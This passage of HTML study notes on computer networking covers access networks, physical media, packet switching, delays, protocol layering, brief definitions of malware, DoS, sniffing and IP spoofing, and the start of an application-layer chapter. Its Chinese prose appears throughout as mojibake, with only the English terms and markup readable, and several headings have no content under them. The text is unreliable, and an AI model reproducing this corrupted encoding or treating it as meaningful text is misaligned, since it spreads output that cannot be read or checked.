ä¸‹è¡Œä¼¼ä¹ä¸ºä¸‹è½½æˆ–æ¥æ”¶æ•°æ®.</p><p>ç”µç¼†å› ç‰¹ç½‘æ¥å…¥ (cable Internet access), å…¶ä¸€ä¸ªé‡è¦ç‰¹å¾å°±æ˜¯å…±äº«å¹¿æ’­åª’ä½“. </p><p>å…‰çº¤åˆ°æˆ· (Fiber To The Home, FTTH) ä¸ºä»æœ¬åœ°ä¸­å¿ƒå±€ç›´æ¥åˆ°å®¶åº­æä¾›ä¸€æ¡å…‰çº¤è·¯å¾„.</p><p>æ¯ä¸ªå®¶åº­å…·æœ‰ä¸€ä¸ªå…‰çº¤ç½‘ç»œç«¯æ¥å™¨ (Optical Network Terminator, ONT), å®ƒç”±ä¸“é—¨çš„å…‰çº¤è¿æ¥åˆ°é‚»è¿‘çš„åˆ†é…å™¨ (splitter). è¯¥åˆ†é…å™¨æŠŠä¸€äº›å®¶åº­é›†ç»“åˆ°ä¸€æ ¹å…±äº«çš„å…‰çº¤, è¯¥å…‰çº¤å†è¿æ¥åˆ°æœ¬åœ°ç”µè¯å’Œå…¬å¸çš„ä¸­å¿ƒå±€ä¸­çš„å…‰çº¤è·¯ç«¯æ¥å™¨ (Optical Line Terminator, OLT). OLT æä¾›äº†å…‰ä¿¡å·å’Œç”µä¿¡å·ä¹‹é—´çš„è½¬æ¢.<br><img src="/../img/optical_line_terminator.png"></p><h4 id="2-ä¼ä¸š-å’Œå®¶åº­-æ¥å…¥-ä»¥å¤ªç½‘å’Œ-WIFI"><a href="#2-ä¼ä¸š-å’Œå®¶åº­-æ¥å…¥-ä»¥å¤ªç½‘å’Œ-WIFI" class="headerlink" title="2. ä¼ä¸š (å’Œå®¶åº­) æ¥å…¥: ä»¥å¤ªç½‘å’Œ WIFI"></a>2. ä¼ä¸š (å’Œå®¶åº­) æ¥å…¥: ä»¥å¤ªç½‘å’Œ WIFI</h4><h3 id="1-2-2-ç‰©ç†åª’ä½“"><a href="#1-2-2-ç‰©ç†åª’ä½“" class="headerlink" title="1.2.2 ç‰©ç†åª’ä½“"></a>1.2.2 ç‰©ç†åª’ä½“</h3><p>ç‰©ç†åª’ä»‹åˆ†æˆä¸¤ç§ç±»å‹:</p><ul><li>å¯¼å¼•å‹åª’ä½“ (guided media), ç”µæ³¢æ²¿ç€å›ºä½“åª’ä»‹å‰è¡Œ</li><li>éå¯¼å¼•å‹åª’ä½“ (unguided media), ç”µæ³¢åœ¨ç©ºæ°”æˆ–å¤–å±‚ç©ºé—´ä¸­ä¼ æ’­</li></ul><p>ç‰©ç†é“¾è·¯çš„å®é™…æˆæœ¬ä¸å…¶ä»–ç½‘ç»œæˆæœ¬ç›¸æ¯”é€šå¸¸æ˜¯ç›¸å½“å°çš„.</p><h4 id="1-åŒç»é“œçº¿"><a href="#1-åŒç»é“œçº¿" class="headerlink" title="1. åŒç»é“œçº¿"></a>1. åŒç»é“œçº¿</h4><p><img src="/../img/two_copper_wires.jpg"></p><p>å…¶ç”±ä¸¤æ ¹ç»ç¼˜çš„é“œçº¿ç»„æˆ, æ¯æ ¹å¤§çº¦ 1mm ç²—, ä¸€è§„åˆ™çš„èºæ—‹çŠ¶æ’åˆ—.</p><p>ä¸¤æ ¹çº¿ç»åˆèµ·æ¥ï¼Œ ä»¥å‡å°‘é‚»è¿‘ç±»ä¼¼çš„åŒç»çº¿çš„ç”µæ°”å¹²æ‰°</p><p>åŒç»çº¿çš„æ•°æ®ä¼ è¾“é€Ÿç‡å–å†³äºçº¿çš„ç²—ç»†ä»¥åŠä¼ è¾“æ–¹å’Œæ¥æ”¶æ–¹ä¹‹é—´çš„è·ç¦».</p><h4 id="2-åŒè½´ç”µç¼†"><a href="#2-åŒè½´ç”µç¼†" class="headerlink" title="2. åŒè½´ç”µç¼†"></a>2. åŒè½´ç”µç¼†</h4><p>åŒè½´ç”µç¼†ç”±ä¸¤ä¸ªé“œå¯¼ä½“ç»„æˆï¼Œ è¿™ä¸¤ä¸ªå¯¼ä½“æ˜¯åŒå¿ƒçš„è€Œä¸æ˜¯å¹¶è¡Œçš„.</p><p>åŒè½´ç”µç¼†èƒ½è¢«ç”¨ä½œå¯¼å¼•å‹å…±äº«åª’ä½“ (shared medium).</p><p>è®¸å¤šç«¯ç³»ç»Ÿèƒ½å¤Ÿç›´æ¥ä¸è¯¥ç”µç¼†ç›¸è¿ï¼Œ æ¯ä¸ªç«¯ç³»ç»Ÿéƒ½èƒ½æ¥æ”¶ç”±å…¶ä»–ç«¯ç³»ç»Ÿå‘é€çš„å†…å®¹.</p><h4 id="3-å…‰çº¤"><a href="#3-å…‰çº¤" class="headerlink" title="3. å…‰çº¤"></a>3. å…‰çº¤</h4><p>å…‰çº¤æ˜¯ä¸€ç§ç»†è€ŒæŸ”è½¯çš„ï¼Œèƒ½å¤Ÿå¯¼å¼•å…‰è„‰å†²çš„åª’ä½“ï¼Œæ¯ä¸ªè„‰å†²è¡¨ç¤ºä¸€ä¸ªæ¯”ç‰¹ã€‚</p><p>å…‰çº¤ä¸å—ç”µç£å¹²æ‰°ï¼Œå…‰ç¼†ä¿¡å·è¡°å‡æä½ï¼Œéš¾ä»¥çªƒå¬.</p><p>å…‰çº¤èƒ½ç”¨äºé•¿é€”å¼•å¯¼å‹ä¼ è¾“åª’ä½“ï¼Œç‰¹åˆ«æ˜¯è·¨æµ·é“¾è·¯.</p><p>é«˜æˆæœ¬çš„å…‰è®¾å¤‡ï¼Œå¦‚å‘å°„å™¨ï¼Œæ¥æ”¶å™¨å’Œäº¤æ¢æœºï¼Œé˜»ç¢å…‰çº¤åœ¨ç«¯æä¼ è¾“ä¸­çš„åº”ç”¨.</p><h4 id="4-é™†åœ°æ— çº¿ç”µä¿¡é“"><a href="#4-é™†åœ°æ— çº¿ç”µä¿¡é“" class="headerlink" title="4. é™†åœ°æ— çº¿ç”µä¿¡é“"></a>4. é™†åœ°æ— çº¿ç”µä¿¡é“</h4><p>æ— çº¿ç”µä¿¡é“æ‰¿è½½ç”µç£é¢‘è°±ä¸­çš„ä¿¡å·ã€‚</p><p>å…¶ä¸éœ€è¦å®‰è£…ç‰©ç†çº¿è·¯ï¼Œ</p><p>å…¶æå¤§ä¾èµ–äºä¼ æ’­ç¯å¢ƒå’Œä¿¡å·ä¼ è¾“çš„è·ç¦».</p><h4 id="5-å«æ˜Ÿæ— çº¿ç”µä¿¡é“"><a href="#5-å«æ˜Ÿæ— çº¿ç”µä¿¡é“" class="headerlink" title="5. å«æ˜Ÿæ— çº¿ç”µä¿¡é“"></a>5. å«æ˜Ÿæ— çº¿ç”µä¿¡é“</h4><p>ä¸€é¢—é€šä¿¡å«æ˜Ÿè¿æ¥åœ°çƒä¸Šçš„ä¸¤ä¸ªæˆ–å¤šä¸ªå¾®åšå‘å°„å™¨&#x2F;æ¥æ”¶å™¨ï¼Œå®ƒä»¬è¢«ç§°ä¸ºåœ°é¢ç«™ã€‚è¯¥å«æ˜Ÿåœ¨ä¸€ä¸ªé¢‘æ®µä¸Šæ¥æ”¶ä¼ è¾“ï¼Œä½¿ç”¨ä¸€ä¸ªè½¬å‘å™¨å†ç”Ÿä¿¡å·ï¼Œå¹¶åœ¨å¦ä¸€ä¸ªé¢‘ç‡ä¸Šå‘å°„ä¿¡å·.</p><h2 id="1-3-ç½‘ç»œæ ¸å¿ƒ"><a href="#1-3-ç½‘ç»œæ ¸å¿ƒ" class="headerlink" title="1.3 ç½‘ç»œæ ¸å¿ƒ"></a>1.3 ç½‘ç»œæ ¸å¿ƒ</h2><h3 id="1-3-1-åˆ†ç»„äº¤æ¢"><a href="#1-3-1-åˆ†ç»„äº¤æ¢" class="headerlink" title="1.3.1 åˆ†ç»„äº¤æ¢"></a>1.3.1 åˆ†ç»„äº¤æ¢</h3><p>å°†é•¿æŠ¥æ–‡åˆ’åˆ†ä¸ºè¾ƒå°çš„æ•°æ®å—.</p><h4 id="1-å­˜å‚¨è½¬å‘ä¼ è¾“-store-and-forward-transmission"><a href="#1-å­˜å‚¨è½¬å‘ä¼ è¾“-store-and-forward-transmission" class="headerlink" title="1. å­˜å‚¨è½¬å‘ä¼ è¾“ (store-and-forward transmission)"></a>1. å­˜å‚¨è½¬å‘ä¼ è¾“ (store-and-forward transmission)</h4><p>ä¸€ç§è½¬å‘æœºåˆ¶. æŒ‡åœ¨äº¤æ¢æœºèƒ½å¤Ÿå¼€å§‹å‘è¾“å‡ºé“¾è·¯ä¼ è¾“è¯¥åˆ†ç»„çš„ç¬¬ä¸€ä¸ªæ¯”ç‰¹ä¹‹å‰ï¼Œå¿…é¡»æ¥æ”¶åˆ°æ•´ä¸ªåˆ†ç»„.</p><p>æ„æ€å°±æ˜¯ï¼Œä¸€ä¸ªåˆ†ç»„çš„ç¬¬ä¸€ä¸ªæ¯”ç‰¹åˆ°è¾¾äº¤æ¢æœºæ—¶ä¸ä¼šè¢«ç«‹å³è½¬å‘å‡ºå»ï¼Œè€Œæ˜¯ç­‰åˆ°è¿™ä¸ªåˆ†ç»„çš„æ‰€æœ‰æ¯”ç‰¹éƒ½åˆ°è¾¾æ—¶å¼€å§‹è½¬å‘.</p><h4 id="2-æ’é˜Ÿæ—¶å»¶å’Œåˆ†ç»„ä¸¢å¤±"><a href="#2-æ’é˜Ÿæ—¶å»¶å’Œåˆ†ç»„ä¸¢å¤±" class="headerlink" title="2. æ’é˜Ÿæ—¶å»¶å’Œåˆ†ç»„ä¸¢å¤±"></a>2. æ’é˜Ÿæ—¶å»¶å’Œåˆ†ç»„ä¸¢å¤±</h4><p>æ²¡å¤ªåˆ†ç»„äº¤æ¢æœºæœ‰å¤šæ¡é“¾è·¯ä¸ä¹‹ç›¸è¿ï¼Œ å¯¹äºæ¯æ¡ç›¸è¿çš„é“¾è·¯ï¼Œè¯¥åˆ†ç»„äº¤æ¢æœºå…·æœ‰ä¸€ä¸ªè¾“å‡ºç¼“å­˜ (output buffer, ä¹Ÿç§°è¾“å‡ºé˜Ÿåˆ— output queue)ï¼Œç”¨äºå­˜å‚¨è·¯ç”±å™¨å‡†å¤‡å‘å¾€é‚£æ¡é“¾è·¯çš„åˆ†ç»„.</p><p>åˆ†ç»„åˆ°è¾¾æ—¶ï¼Œé“¾è·¯æ­£å¿™äºä¼ è¾“å…¶ä»–åˆ†ç»„ï¼Œè¯¥åˆ°è¾¾åˆ†ç»„å°±å¿…é¡»åœ¨ç¼“å­˜ä¸­ç­‰å¾…. æ­¤æ—¶æœ‰æ’é˜Ÿæ—¶å»¶ (queuing delay).</p><p>åˆ†ç»„åˆ°è¾¾æ—¶ï¼Œç¼“å­˜ç©ºé—´è¢«å æ»¡ï¼Œå°†å‡ºç°åˆ†ç»„ä¸¢åŒ… (packet loss).</p><h4 id="3-è½¬å‘è¡¨å’Œè·¯ç”±é€‰æ‹©åè®®"><a href="#3-è½¬å‘è¡¨å’Œè·¯ç”±é€‰æ‹©åè®®" class="headerlink" title="3. è½¬å‘è¡¨å’Œè·¯ç”±é€‰æ‹©åè®®"></a>3. è½¬å‘è¡¨å’Œè·¯ç”±é€‰æ‹©åè®®</h4><p>å› ç‰¹ç½‘å…·æœ‰ä¸€äº›ç‰¹æ®Šçš„è·¯ç”±é€‰æ‹©åè®® (routing protocol), ç”¨äºè‡ªåŠ¨åœ°è®¾ç½®è¿™äº›è½¬å‘è¡¨. å¦‚é€‰æ‹©æœ€çŸ­çš„è·¯å¾„.</p><h3 id="1-3-2-ç”µè·¯äº¤æ¢"><a href="#1-3-2-ç”µè·¯äº¤æ¢" class="headerlink" title="1.3.2 ç”µè·¯äº¤æ¢"></a>1.3.2 ç”µè·¯äº¤æ¢</h3><p>é€šè¿‡ç½‘ç»œé“¾è·¯å’Œäº¤æ¢æœºç§»åŠ¨æ•°æ®æœ‰ä¸¤ç§åŸºæœ¬æ–¹æ³•:</p><ul><li>ç”µè·¯äº¤æ¢ (circuit switching)</li><li>åˆ†ç»„äº¤æ¢ (packet switching)</li></ul><p>ç”µè·¯äº¤æ¢åœ¨å‘é€æ–¹èƒ½å¤Ÿå‘é€ä¿¡æ¯ä¹‹å‰ï¼Œè¯¥ç½‘ç»œå¿…é¡»åœ¨å‘é€æ”¾å’Œæ¥æ”¶æ–¹ä¹‹é—´å»ºç«‹ä¸€æ¡è¿æ¥. å…¶éœ€è¦é¢„ç•™ç«¯ç³»ç»Ÿé—´æ²¿è·¯å¾„é€šä¿¡æ‰€éœ€è¦çš„èµ„æº.</p><p>å½“ç½‘ç»œåˆ›å»ºè¿™ç§ç”µè·¯æ—¶ï¼Œå®ƒä¹Ÿåœ¨è¿æ¥æœŸé—´åœ¨è¯¥ç½‘ç»œé“¾è·¯ä¸Šé¢„ç•™äº†æ’å®šçš„ä¼ è¾“é€Ÿç‡.</p><p>ä¹Ÿå°±æ˜¯è¯´è¦å…ˆåˆ†é…èµ„æºï¼Œå†å¼€å§‹ä¼ è¾“.</p><h4 id="1-ç”µè·¯äº¤æ¢ç½‘ç»œä¸­çš„å¤ç”¨"><a href="#1-ç”µè·¯äº¤æ¢ç½‘ç»œä¸­çš„å¤ç”¨" class="headerlink" title="1. ç”µè·¯äº¤æ¢ç½‘ç»œä¸­çš„å¤ç”¨"></a>1. ç”µè·¯äº¤æ¢ç½‘ç»œä¸­çš„å¤ç”¨</h4><p>é“¾è·¯ä¸­çš„ç”µè·¯æ˜¯é€šè¿‡é¢‘åˆ†å¤ç”¨ (Frequency-Division Multiplexing, FDM) æˆ–æ—¶åˆ†å¤ç”¨ (Time-Division Multiplexing, TDM) æ¥å®ç°.</p><p>FDM, é“¾è·¯ä¸ºæ¯æ¡è¿æ¥è®¾ä¸“ç”¨çš„ä¸€ä¸ªé¢‘æ®µ.</p><p>TDM, æ—¶é—´è¢«åˆ’åˆ†ä¸ºå›ºå®šæœŸé—´çš„å¸§ï¼Œå¹¶ä¸”æ¯ä¸ªå¸§åˆè¢«åˆ’åˆ†ä¸ºå›ºå®šæ•°é‡çš„æ—¶éš™ã€‚ä¹Ÿå°±æ˜¯è¯´ä¸€æ¡é“¾è·¯ä¸­çš„æ•°æ®ä¸æ˜¯è¿ç»­çš„å•ä¸ªç”µè·¯çš„æ•°æ®ï¼Œè€Œæ˜¯æ··åˆçš„ï¼Œæ¯ä¸€ä¸ªç”µè·¯å ä¸€éƒ¨åˆ†. ä¸¤ä¸ªæ—¶éš™è¡¨æ˜æœ‰ä¸¤æ¡ç”µè·¯ï¼Œ10 ä¸ªæ—¶éš™è¡¨æ˜æœ‰åæ¡ç”µè·¯.<br><img src="/../img/explain_FDM_TDM.png"></p><h4 id="2-åˆ†ç»„äº¤æ¢ä¸ç”µè·¯äº¤æ¢çš„å¯¹æ¯”"><a href="#2-åˆ†ç»„äº¤æ¢ä¸ç”µè·¯äº¤æ¢çš„å¯¹æ¯”" class="headerlink" title="2. åˆ†ç»„äº¤æ¢ä¸ç”µè·¯äº¤æ¢çš„å¯¹æ¯”"></a>2. åˆ†ç»„äº¤æ¢ä¸ç”µè·¯äº¤æ¢çš„å¯¹æ¯”</h4><h3 id="1-3-3-ç½‘ç»œçš„ç½‘ç»œ"><a href="#1-3-3-ç½‘ç»œçš„ç½‘ç»œ" class="headerlink" title="1.3.3 ç½‘ç»œçš„ç½‘ç»œ"></a>1.3.3 ç½‘ç»œçš„ç½‘ç»œ</h3><h2 id="1-4-åˆ†ç»„äº¤æ¢ç½‘ä¸­çš„æ—¶å»¶ï¼Œä¸¢åŒ…å’Œååé‡"><a href="#1-4-åˆ†ç»„äº¤æ¢ç½‘ä¸­çš„æ—¶å»¶ï¼Œä¸¢åŒ…å’Œååé‡" class="headerlink" title="1.4 åˆ†ç»„äº¤æ¢ç½‘ä¸­çš„æ—¶å»¶ï¼Œä¸¢åŒ…å’Œååé‡"></a>1.4 åˆ†ç»„äº¤æ¢ç½‘ä¸­çš„æ—¶å»¶ï¼Œä¸¢åŒ…å’Œååé‡</h2><p>ååé‡æŒ‡æ¯ç§’èƒ½å¤Ÿä¼ é€çš„æ•°æ®é‡.</p><h3 id="1-4-1-åˆ†ç»„äº¤æ¢ç½‘ä¸­çš„æ—¶å»¶æ¦‚è¿°"><a href="#1-4-1-åˆ†ç»„äº¤æ¢ç½‘ä¸­çš„æ—¶å»¶æ¦‚è¿°" class="headerlink" title="1.4.1 åˆ†ç»„äº¤æ¢ç½‘ä¸­çš„æ—¶å»¶æ¦‚è¿°"></a>1.4.1 åˆ†ç»„äº¤æ¢ç½‘ä¸­çš„æ—¶å»¶æ¦‚è¿°</h3><p>æœ€ä¸ºé‡è¦çš„æ—¶å»¶å¦‚èŠ‚ç‚¹å¤„ç†æ—¶å»¶ (nodal processing delay), æ’é˜Ÿæ—¶å»¶ (queuing delay), ä¼ è¾“æ—¶å»¶ (transmission delay) å’Œä¼ æ’­æ—¶å»¶ (propagation delay)ï¼Œè¿™äº›æ—¶å»¶æ€»ä½“ç´¯åŠ èµ·æ¥æ˜¯èŠ‚ç‚¹æ€»æ—¶å»¶ (total nodal delay).</p><h4 id="æ—¶å»¶ç±»å‹"><a href="#æ—¶å»¶ç±»å‹" class="headerlink" title="æ—¶å»¶ç±»å‹"></a>æ—¶å»¶ç±»å‹</h4><h5 id="ä¼ è¾“æ—¶å»¶å’Œä¼ æ’­æ—¶å»¶çš„æ¯”è¾ƒ"><a href="#ä¼ è¾“æ—¶å»¶å’Œä¼ æ’­æ—¶å»¶çš„æ¯”è¾ƒ" class="headerlink" title="ä¼ è¾“æ—¶å»¶å’Œä¼ æ’­æ—¶å»¶çš„æ¯”è¾ƒ"></a>ä¼ è¾“æ—¶å»¶å’Œä¼ æ’­æ—¶å»¶çš„æ¯”è¾ƒ</h5><p>ä¼ è¾“æ—¶å»¶ (transmission delay) æŒ‡å°†åˆ†ç»„é€ä¸Šé“¾è·¯æ‰€ç”¨çš„æ—¶é—´.</p><p>ä¼ æ’­æ—¶å»¶ (propagation delay) æŒ‡å°†åˆ†ç»„ä»æºè·¯ç”±å™¨å‘é€åˆ°ç›®æ ‡çš„æ—¶é—´.</p><h3 id="1-4-2-æ’é˜Ÿæ—¶å»¶å’Œä¸¢åŒ…"><a href="#1-4-2-æ’é˜Ÿæ—¶å»¶å’Œä¸¢åŒ…" class="headerlink" title="1.4.2 æ’é˜Ÿæ—¶å»¶å’Œä¸¢åŒ…"></a>1.4.2 æ’é˜Ÿæ—¶å»¶å’Œä¸¢åŒ…</h3><p>æ’é˜Ÿæ—¶å»¶å¯¹ä¸åŒçš„åˆ†ç»„å¯èƒ½æ˜¯ä¸åŒçš„.</p><p>è‹¥ <code>a</code> è¡¨ç¤ºåˆ†ç»„åˆ°è¾¾é˜Ÿåˆ—çš„ç“¶è•¨é€Ÿç‡ï¼Œ(a çš„å•ä½æ˜¯åˆ†ç»„&#x2F;ç§’ï¼Œå³ pkt&#x2F;s).</p><p><code>R</code> æ˜¯ä¼ è¾“é€Ÿç‡ï¼Œå³ä»é˜Ÿåˆ—ä¸­æ¨å‡ºæ¯”ç‰¹çš„é€Ÿç‡ (ä»¥ bpsï¼Œå³ b&#x2F;s ä¸ºå•ä½).</p><p>åŒæ—¶å‡å®šæ‰€æœ‰åˆ†ç»„éƒ½æ˜¯ç”± L æ¯”ç‰¹ç»„æˆ. åˆ™æ¯”ç‰¹åˆ°è¾¾é˜Ÿåˆ—çš„å¹³å‡é€Ÿç‡æ˜¯ La bps.</p><p>æ¯”ç‡ <code>La/R</code> è¢«ç§°ä¸º <mark>æµé‡å¼ºåº¦ (traddic intensity)</mark> </p><p>è®¾è®¡ç³»ç»Ÿæ—¶æµé‡å¼ºåº¦ä¸èƒ½å¤§äº 1.</p><p>é€šå¸¸ï¼Œåˆ°è¾¾é˜Ÿåˆ—çš„è¿‡ç¨‹æ˜¯éšæœºçš„.</p><h4 id="ä¸¢åŒ…"><a href="#ä¸¢åŒ…" class="headerlink" title="ä¸¢åŒ…"></a>ä¸¢åŒ…</h4><h3 id="1-4-3-ç«¯åˆ°ç«¯æ—¶å»¶"><a href="#1-4-3-ç«¯åˆ°ç«¯æ—¶å»¶" class="headerlink" title="1.4.3 ç«¯åˆ°ç«¯æ—¶å»¶"></a>1.4.3 ç«¯åˆ°ç«¯æ—¶å»¶</h3><h3 id="1-4-4-è®¡ç®—æœºç½‘ç»œä¸­çš„ååé‡"><a href="#1-4-4-è®¡ç®—æœºç½‘ç»œä¸­çš„ååé‡" class="headerlink" title="1.4.4 è®¡ç®—æœºç½‘ç»œä¸­çš„ååé‡"></a>1.4.4 è®¡ç®—æœºç½‘ç»œä¸­çš„ååé‡</h3><h2 id="1-5-åè®®å±‚æ¬¡åŠå…¶æœåŠ¡æ¨¡å‹"><a href="#1-5-åè®®å±‚æ¬¡åŠå…¶æœåŠ¡æ¨¡å‹" class="headerlink" title="1.5 åè®®å±‚æ¬¡åŠå…¶æœåŠ¡æ¨¡å‹"></a>1.5 åè®®å±‚æ¬¡åŠå…¶æœåŠ¡æ¨¡å‹</h2><h3 id="1-åè®®åˆ†å±‚"><a href="#1-åè®®åˆ†å±‚" class="headerlink" title="1. åè®®åˆ†å±‚"></a>1. åè®®åˆ†å±‚</h3><p>ä¸€ä¸ªåè®®å±‚èƒ½å¤Ÿç”¨è½¯ä»¶ï¼Œç¡¬ä»¶æˆ–ä¸¤è€…çš„ç»“åˆæ¥å®ç°.</p><p>ç½‘ç»œå±‚ç»å¸¸æ˜¯ç¡¬ä»¶å’Œè½¯ä»¶å®ç°çš„æ··åˆä½“.</p><p>åˆ†å±‚æä¾›äº†ä¸€ç§ç»“æ„åŒ–æ–¹å¼æ¥è®¨è®ºç³»ç»Ÿç»„ä»¶.</p><p>æ¨¡å—åŒ–ä½¿æ›´æ–°ç³»ç»Ÿç»„ä»¶æ›´ä¸ºå®¹æ˜“.</p><p>åˆ†å±‚çš„ä¸€ä¸ªæ½œåœ¨ç¼ºç‚¹æ˜¯ä¸€å±‚å¯èƒ½å†—ä½™è¾ƒä½å±‚çš„åŠŸèƒ½.</p><p>å„å±‚çš„æ‰€æœ‰åè®®è¢«ç§°ä¸ºåè®®æ ˆ (protocol stack), å› ç‰¹ç½‘çš„åè®®æ ˆç”± 5 ä¸ªå±‚æ¬¡ç»„æˆ:</p><ul><li>ç‰©ç†å±‚</li><li>é“¾è·¯å±‚</li><li>ç½‘ç»œå±‚</li><li>è¿è¾“å±‚</li><li>åº”ç”¨å±‚</li></ul><p><img src="/../img/tcp_and_osi.png"></p><h4 id="1-åº”ç”¨å±‚"><a href="#1-åº”ç”¨å±‚" class="headerlink" title="(1) åº”ç”¨å±‚"></a>(1) åº”ç”¨å±‚</h4><p>ä½äºåº”ç”¨å±‚çš„ä¿¡æ¯åˆ†ç»„ç§°ä¸ºæŠ¥æ–‡ (message).</p><h4 id="2-ä¼ è¾“å±‚"><a href="#2-ä¼ è¾“å±‚" class="headerlink" title="(2) ä¼ è¾“å±‚"></a>(2) ä¼ è¾“å±‚</h4><p>å› ç‰¹ç½‘çš„è¿è¾“å±‚åœ¨åº”ç”¨ç¨‹åºç«¯ç‚¹ä¹‹é—´ä¼ é€åº”ç”¨å±‚æŠ¥æ–‡.</p><p>è¿è¾“å±‚çš„åˆ†ç»„ç§°ä¸ºæŠ¥æ–‡æ®µ (segment).</p><h4 id="3-ç½‘ç»œå±‚"><a href="#3-ç½‘ç»œå±‚" class="headerlink" title="(3) ç½‘ç»œå±‚"></a>(3) ç½‘ç»œå±‚</h4><p>å› ç‰¹ç½‘çš„ç½‘ç»œå±‚è´Ÿè´£å°†ç§°ä¸ºæ•°æ®æŠ¥ (datagram) çš„ç½‘ç»œå±‚åˆ†ç»„ä»ä¸€å°ä¸»æœºç§»åŠ¨åˆ°å¦ä¸€å°ä¸»æœº.</p><h4 id="4-é“¾è·¯å±‚"><a href="#4-é“¾è·¯å±‚" class="headerlink" title="(4) é“¾è·¯å±‚"></a>(4) é“¾è·¯å±‚</h4><p>é“¾è·¯å±‚çš„åˆ†ç»„ç§°ä¸ºå¸§ (frame).</p><p>å…¶å°†æ•´ä¸ªå¸§ä»ä¸€ä¸ªç½‘ç»œå…ƒç´ ç§»åŠ¨åˆ°é‚»è¿‘çš„ç½‘ç»œå…ƒç´ ã€‚</p><h4 id="5-ç‰©ç†å±‚"><a href="#5-ç‰©ç†å±‚" class="headerlink" title="(5) ç‰©ç†å±‚"></a>(5) ç‰©ç†å±‚</h4><p>å°†å¸§ä¸­çš„ä¸€ä¸ªä¸ªæ¯”ç‰¹ä»ä¸€ä¸ªèŠ‚ç‚¹ç§»åŠ¨åˆ°ä¸‹ä¸€ä¸ªèŠ‚ç‚¹.</p><h3 id="2-OSI-æ¨¡å‹"><a href="#2-OSI-æ¨¡å‹" class="headerlink" title="2. OSI æ¨¡å‹"></a>2. OSI æ¨¡å‹</h3><p>è¡¨ç¤ºå±‚çš„ä½œç”¨æ˜¯ä½¿é€šä¿¡çš„åº”ç”¨ç¨‹åºèƒ½å¤Ÿè§£é‡Šäº¤æ¢æ•°æ®çš„å«ä¹‰.</p><p>ä¼šè¯å±‚æä¾›äº†æ•°æ®äº¤æ¢çš„å®šç•Œå’ŒåŒæ­¥åŠŸèƒ½.</p><h3 id="1-5-2-å°è£…"><a href="#1-5-2-å°è£…" class="headerlink" title="1.5.2 å°è£…"></a>1.5.2 å°è£…</h3><p>é“¾è·¯äº¤æ¢æœºå®ç°äº†ç¬¬ä¸€å±‚å’Œç¬¬äºŒå±‚.</p><p>è·¯ç”±å™¨å®ç°äº†ç¬¬ä¸€å±‚åˆ°ç¬¬ä¸‰å±‚.</p><p>åº”ç”¨å±‚æŠ¥æ–‡å’Œè¿è¾“å±‚é¦–éƒ¨ä¿¡æ¯ä¸€é“æ„æˆäº†è¿è¾“å±‚æŠ¥æ–‡æ®µ (transport-layer segment).</p><p>åœ¨æ¯ä¸€å±‚ï¼Œä¸€ä¸ªåˆ†ç»„å…·æœ‰ä¸¤ç§ç±»å‹çš„å­—æ®µ: é¦–éƒ¨å­—æ®µå’Œæœ‰æ•ˆè½½è·å­—æ®µ (payload field). æœ‰æ•ˆè½½è·é€šå¸¸æ˜¯æ¥è‡ªä¸Šä¸€å±‚çš„åˆ†ç»„.<br><img src="/../img/encapsulation.png"></p><h2 id="1-6-é¢å¯¹æ”»å‡»çš„ç½‘ç»œ"><a href="#1-6-é¢å¯¹æ”»å‡»çš„ç½‘ç»œ" class="headerlink" title="1.6 é¢å¯¹æ”»å‡»çš„ç½‘ç»œ"></a>1.6 é¢å¯¹æ”»å‡»çš„ç½‘ç»œ</h2><p>å¤šæ•°æ¶æ„è½¯ä»¶ (malware) æ˜¯è‡ªæˆ‘å¤åˆ¶çš„.</p><p>ç—…æ¯’ (virus) æ˜¯ä¸€ç§éœ€è¦æŸç§å½¢å¼çš„ç”¨æˆ·äº¤äº’æ¥æ„ŸæŸ“ç”¨æˆ·è®¾å¤‡çš„æ¶æ„è½¯ä»¶.</p><p>è •è™« (worm) æ˜¯ä¸€ç§æ— é¡»ä»»ä½•æ˜æ˜¾ç”¨æˆ·äº¤äº’å°±èƒ½è¿›å…¥è®¾å¤‡çš„æ¶æ„è½¯ä»¶.</p><p>æ‹’ç»æœåŠ¡æ”»å‡» (Denial-of-Service, DoS, attack). å…¶ä½¿å¾—ç½‘ç»œï¼Œä¸»æœºæˆ–å…¶ä»–åŸºç¡€è®¾æ–½éƒ¨åˆ†ä¸èƒ½ç”±åˆæ³•ç”¨æˆ·ä½¿ç”¨.</p><p>å¤§å¤šæ•° DoS å±äº:</p><ul><li>å¼±ç‚¹æ”»å‡»</li><li>å¸¦å®½æ”»å‡»</li><li>è¿æ¥æ´ªæ³›</li></ul><p>DDoS (Distributed DoS, åˆ†å¸ƒå¼ DoS)<br><img src="/../img/DDoS.png"></p><h3 id="å—…æ¢åˆ†ç»„"><a href="#å—…æ¢åˆ†ç»„" class="headerlink" title="å—…æ¢åˆ†ç»„"></a>å—…æ¢åˆ†ç»„</h3><p>è®°å½•æ¯ä¸ªæµç»çš„åˆ†ç»„å‰¯æœ¬çš„è¢«åŠ¨æ¥æ”¶æœºè¢«ç§°ä¸ºåˆ†ç»„å—…æ¢å™¨ (packet sniffer).</p><h3 id="ä¼ªè£…"><a href="#ä¼ªè£…" class="headerlink" title="ä¼ªè£…"></a>ä¼ªè£…</h3><p>å°†å…·æœ‰è™šå‡æºåœ°å€çš„åˆ†ç»„æ³¨å…¥å› ç‰¹ç½‘çš„èƒ½åŠ›è¢«ç§°ä¸º IP å“„éª— (IP spoofing).</p><h1 id="ç¬¬äºŒç« -åº”ç”¨å±‚"><a href="#ç¬¬äºŒç« -åº”ç”¨å±‚" class="headerlink" title="ç¬¬äºŒç«  åº”ç”¨å±‚"></a>ç¬¬äºŒç«  åº”ç”¨å±‚</h1><h2 id="2-1-åº”ç”¨å±‚åè®®åŸç†"><a href="#2-1-åº”ç”¨å±‚åè®®åŸç†" class="headerlink" title="2.1 åº”ç”¨å±‚åè®®åŸç†"></a>2.1 åº”ç”¨å±‚åè®®åŸç†</h2><p>ä¸¤ç§ä¸»æµä½“ç³»ç»“æ„ä¹‹ä¸€: å®¢æˆ·-æœåŠ¡å™¨ä½“ç³»ç»“æ„ æˆ–å¯¹ç­‰ (P2P) ä½“ç³»ç»“æ„.</p><p>å®¢æˆ·-æœåŠ¡å™¨ä½“ç³»ç»“æ„ (client-server architecture), æœ‰ä¸€ä¸ªæ€»æ˜¯æ‰“å¼€çš„ä¸»æœºç§°ä¸ºæœåŠ¡å™¨ï¼Œå®ƒæœåŠ¡äºæ¥è‡ªè®¸å¤šå…¶ä»–ç§°ä¸ºå®¢æˆ·çš„ä¸»æœºçš„è¯·æ±‚. 